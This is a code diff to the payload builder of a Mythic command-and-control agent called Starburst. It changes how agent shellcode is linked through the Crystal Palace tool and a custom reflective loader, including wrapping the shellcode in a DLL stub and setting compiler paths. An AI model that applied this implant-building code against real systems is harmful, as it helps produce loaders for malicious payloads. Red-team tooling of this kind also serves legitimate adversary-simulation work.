@@ -10,6 +10,7 @@ import logging
 from mythic_container.PayloadBuilder import *
 from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
+from ..crystal_utilities import _wrap_shellcode_in_dll
 
 logger = logging.getLogger("starburst.builder")
 
@@ -329,14 +330,8 @@ class Starburst(PayloadType):
                 resp.build_message = f"Starburst {arch} shellcode: {len(shellcode)} bytes"
 
             elif output_type == "shellcode":
-                if os.path.exists(exe_path):
-                    with open(exe_path, "rb") as f:
-                        pe_bytes = f.read()
-                    cp_result = await self._link_with_crystal_palace(
-                        pe_bytes, arch, agent_build_path)
-                else:
-                    cp_result = None
-                    logger.error(f"PE not found at {exe_path} for Crystal Palace linking")
+                cp_result = await self._link_with_crystal_palace(
+                    shellcode, arch, agent_build_path)
                 if cp_result is None:
                     resp.status = BuildStatus.Error
                     resp.build_message = "Crystal Palace linking failed"
@@ -351,14 +346,8 @@ class Starburst(PayloadType):
                 resp.build_message = f"Starburst {arch} Crystal Palace shellcode: {len(cp_result)} bytes"
 
             else:
-                if os.path.exists(exe_path):
-                    with open(exe_path, "rb") as f:
-                        pe_bytes = f.read()
-                    linked_sc = await self._link_with_crystal_palace(
-                        pe_bytes, arch, agent_build_path)
-                else:
-                    linked_sc = None
-                    logger.warning(f"PE not found at {exe_path}, falling back to raw shellcode")
+                linked_sc = await self._link_with_crystal_palace(
+                    shellcode, arch, agent_build_path)
                 if linked_sc is None:
                     logger.warning("CPL link failed for DLL/EXE, falling back to raw shellcode")
                     linked_sc = shellcode
@@ -694,9 +683,17 @@ class Starburst(PayloadType):
             with zipfile.ZipFile(zip_buf, 'r') as z:
                 z.extractall(udrl_dir)
 
+            make_env = os.environ.copy()
+            extra_paths = []
+            for d in [r"C:\msys64\mingw64\bin", r"C:\msys64\mingw32\bin",
+                       "/usr/bin", "/usr/local/bin"]:
+                if os.path.isdir(d):
+                    extra_paths.append(d)
+            if extra_paths:
+                make_env["PATH"] = os.pathsep.join(extra_paths) + os.pathsep + make_env.get("PATH", "")
             make_proc = subprocess.run(
                 ["make", arch],
-                cwd=udrl_dir,
+                cwd=udrl_dir, env=make_env,
                 capture_output=True, text=True, timeout=60)
             if make_proc.returncode != 0:
                 logger.error(f"Custom UDRL compile failed: {make_proc.stderr}")
@@ -706,19 +703,34 @@ class Starburst(PayloadType):
         else:
             loader_path = os.path.join(cp_path, "default")
 
-        sc_file = os.path.join(build_path, "starburst_sc.bin")
         out_file = os.path.join(build_path, f"out.{arch}.bin")
-
-        with open(sc_file, "wb") as f:
-            f.write(shellcode)
 
         spec_file = os.path.join(loader_path, "loader.spec")
         if not os.path.exists(spec_file):
             logger.error(f"loader.spec not found at {spec_file}")
             return None
 
-        command = ["java", "-jar", jar_path, "link", spec_file, sc_file, out_file]
-        logger.info(f"Crystal Palace link: {' '.join(command)}")
+        if use_custom:
+            try:
+                dll_path = _wrap_shellcode_in_dll(shellcode, arch, build_path)
+            except RuntimeError as e:
+                logger.error(f"DLL stub wrapping failed: {e}")
+                return None
+
+            command = [
+                "java", "-jar", jar_path, "link", spec_file, dll_path, out_file,
+            ]
+        else:
+            sc_file = os.path.join(build_path, "starburst_sc.bin")
+            with open(sc_file, "wb") as f:
+                f.write(shellcode)
+
+            command = [
+                "java", "-jar", jar_path, "build", spec_file, arch, out_file,
+                f'%SHELLCODE={sc_file}',
+            ]
+
+        logger.info(f"Crystal Palace: {' '.join(command)}")
 
         proc = subprocess.run(
             command,
